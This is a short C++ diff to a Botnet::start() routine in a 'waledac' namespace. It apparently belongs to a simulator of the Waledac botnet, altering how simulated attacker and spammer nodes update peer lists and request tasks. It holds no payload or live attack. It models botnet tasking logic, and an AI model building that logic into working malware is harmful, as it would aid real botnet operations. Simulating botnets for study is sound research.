@@ -148,8 +148,7 @@ void Botnet::start()
 	{
 		attacker = dynamic_cast<waledac::Attacker*>(attackers[i].get());
 		attacker->update_rlist();
-		attacker->request_command();
-		attacker->send_message(MESSAGE_TASKREQ);
+		attacker->update_plist();
 	}
 	
 	for(unsigned int i = 0; i < protecters.size(); ++i) 
@@ -169,8 +168,8 @@ void Botnet::start()
 	{
 		spammer = dynamic_cast<waledac::Spammer*>(spammers[i].get());
 		spammer->update_rlist();
-		spammer->request_command();
-		spammer->send_message(MESSAGE_TASKREQ);
+		response_code response = spammer->send_message(MESSAGE_TASKREQ);
+		spammer->update_status(response);
 	}
 
 	return;
